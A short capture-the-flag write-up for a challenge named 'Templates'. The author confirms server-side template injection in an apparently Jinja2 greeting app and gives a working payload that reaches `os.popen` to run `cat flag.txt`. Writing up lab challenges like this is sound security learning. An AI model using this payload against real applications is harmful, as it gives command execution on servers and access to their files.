#### Templates
- points earned: 1 (Points were reduced on this because it was a stolen challenge.)

#### Where's the flag?
- No src code was provided so I have to just go looking for it.
#### Notes / Intuition
- The app is simple, it prompts `Enter your name and we'll greet you!`
- The name of the challenge is `Templates` to I try `{{4*4}}`
	- This returns `16` confirming SSTI in probably Jinja2
- Then I continued standard enumeration by trying Jinja2 SSTI payloads
- There was no input validation so the solution was quite simple.

#### Solution
- Provide the standard Jinja2 SSTI payload below and flag will be in response.
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```
